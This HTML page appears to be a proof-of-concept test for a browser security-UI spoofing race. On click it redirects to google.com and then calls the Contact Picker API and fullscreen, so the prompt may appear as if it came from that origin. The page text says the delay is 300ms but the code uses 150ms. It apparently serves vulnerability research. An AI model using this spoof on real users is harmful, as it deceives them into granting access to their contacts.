<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Security UI Spoof - Permission Race Test</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <style>
            body {
                margin: 0;
                padding: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                font-family: sans-serif;
            }         
        </style>
        <script>
            onclick = async () => {
                // 1. Segera lakukan redirect ke google.com
                window.location.href = "https://www.google.com";

                // 2. Berikan timeout 300ms pada API select kontak
                // Tujuannya melihat apakah dialog muncul saat halaman google.com mulai dimuat
                setTimeout(async () => {
                    try {
                        await navigator.contacts.select(["name"], {});
                    } catch (e) {
                        console.log("Contact picker diblokir atau gagal karena navigasi");
                    }
                }, 150);

                // 3. Tetap mencoba masuk Fullscreen untuk melihat persistensi transisi
                try {
                    if (document.documentElement.requestFullscreen) {
                        await document.documentElement.requestFullscreen();
                    }
                } catch (e) {
                    console.log("Fullscreen request failed");
                }
            }
        </script>
    </head>  
    <body>
        <div id="content">
            <center>
                <h1>Click to Test Permission over Redirect</h1>
                <p>Redirect starts immediately, Contact API delayed by 300ms.</p>
            </center>
        </div>
    </body>
</html>
